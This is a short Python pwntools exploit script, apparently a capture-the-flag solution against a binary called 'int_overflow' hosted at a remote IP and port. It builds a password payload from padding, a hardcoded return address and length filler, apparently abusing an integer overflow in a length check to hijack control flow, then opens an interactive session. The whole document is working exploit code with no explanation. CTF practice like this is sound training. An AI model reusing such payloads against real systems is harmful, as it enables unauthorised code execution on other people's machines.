from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
if len(sys.argv) == 1 or sys.argv[1] == 'l':
    p = process('./int_overflow')
    elf = ELF('./int_overflow')
else:
    p = remote('61.147.171.105', 53303)
    elf = ELF('./int_overflow')
    pause()
p.recvuntil(b'Your choice:')
p.sendline(b'1')
p.sendlineafter(b'username:\n',b'heak')
payload=b'a'*0x18+p32(0x0804868B)
payload=payload.ljust(259,b'a')
print(payload)
p.sendlineafter(b'passwd:\n',payload)
p.interactive()